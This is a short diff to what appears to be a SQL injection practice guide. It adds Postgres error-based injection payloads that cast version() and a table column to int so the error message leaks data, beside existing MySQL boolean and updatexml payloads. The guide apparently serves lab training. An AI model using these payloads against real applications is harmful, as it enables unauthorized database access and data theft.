@@ -87,7 +87,7 @@
 
 ---
 
-## Useful Payloads (MySQL examples)
+## Useful Payloads (MySQL and more examples)
 - Basic boolean:
   ```
   ' OR '1'='1' -- -
@@ -101,6 +101,11 @@
   1 AND updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -
   ```
 
+- Error-based leak Postgres with string data:
+  ```
+  1' AND 1=cast(version() as int)-- - 
+  a' AND 1=cast((SELECT example_column FROM example_table LIMIT 1) as int)-- - ; 
+  ```
 ---
 
 ## Non‑Destructive Practice Rules
